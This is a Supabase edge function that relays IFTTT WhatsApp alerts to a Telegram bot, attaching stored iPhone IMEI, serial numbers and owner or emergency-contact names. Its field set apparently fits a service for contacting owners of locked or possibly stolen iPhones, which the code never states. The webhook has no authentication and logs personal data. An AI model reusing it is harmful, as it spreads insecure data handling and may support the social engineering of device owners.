
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('🔔 Telegram webhook received');
    
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const body = await req.json();
    console.log('📥 Webhook payload:', body);

    // Extraer datos del webhook de IFTTT
    const eventName = body.event || '';
    const message = body.value1 || '';
    const phoneNumber = body.value2 || '';
    const additionalData = body.value3 || '';

    console.log('📋 Extracted data:', { eventName, message, phoneNumber, additionalData });

    if (eventName !== 'whatsapp_alert' || !phoneNumber) {
      console.log('❌ Invalid event or missing phone number');
      return new Response(JSON.stringify({ error: 'Invalid webhook data' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Buscar el proceso más reciente para ese número de teléfono
    const { data: processes, error: processError } = await supabase
      .from('processes')
      .select(`
        id,
        client_name,
        phone_number,
        country_code,
        iphone_model,
        imei,
        serial_number,
        owner_name,
        contact_type,
        user_id,
        created_at
      `)
      .eq('phone_number', phoneNumber)
      .order('created_at', { ascending: false })
      .limit(1);

    if (processError || !processes || processes.length === 0) {
      console.log('❌ Process not found for phone:', phoneNumber);
      return new Response(JSON.stringify({ error: 'Process not found' }), {
        status: 404,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const process = processes[0];
    console.log('✅ Process found:', process.id);

    // Buscar la configuración del bot de Telegram del usuario
    const { data: telegramBot, error: botError } = await supabase
      .from('telegram_bots')
      .select('bot_token, chat_id')
      .eq('user_id', process.user_id)
      .eq('is_active', true)
      .single();

    if (botError || !telegramBot) {
      console.log('❌ Telegram bot not configured for user:', process.user_id);
      return new Response(JSON.stringify({ error: 'Telegram bot not configured' }), {
        status: 404,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    console.log('🤖 Telegram bot found for user');

    // Crear mensaje formateado para Telegram
    const telegramMessage = `🔔 Alerta de proceso de WhatsApp... 👩🏽‍💻👩🏽‍💻Server Astro 🤖Bot Astro online🟢

✅ Respuesta recibida para tu proceso

👤 Cliente: ${process.client_name}
📱 Modelo: ${process.iphone_model}
📟 IMEI: ${process.imei}
🔑 Serie: ${process.serial_number}
${process.owner_name ? `👥 ${process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia'}: ${process.owner_name}` : ''}

📞 Número: ${process.country_code}${process.phone_number}
💬 Mensaje: ${message}

🕐 ${new Date().toLocaleString('es-ES')}
🆔 ID: ${process.id.substring(0, 8)}`;

    // Enviar mensaje a Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramBot.bot_token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramBot.chat_id,
        text: telegramMessage,
        parse_mode: 'HTML'
      }),
    });

    const telegramResult = await telegramResponse.json();
    console.log('📨 Telegram API response:', telegramResult);

    if (telegramResult.ok) {
      console.log('✅ Message sent successfully to Telegram');
      return new Response(JSON.stringify({ 
        success: true, 
        message: 'Notification sent to Telegram successfully',
        process_id: process.id
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    } else {
      console.log('❌ Failed to send Telegram message:', telegramResult);
      throw new Error(`Telegram API error: ${telegramResult.description}`);
    }

  } catch (error) {
    console.error('🚨 Webhook error:', error);
    return new Response(JSON.stringify({ 
      error: 'Internal server error',
      details: error.message 
    }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
})
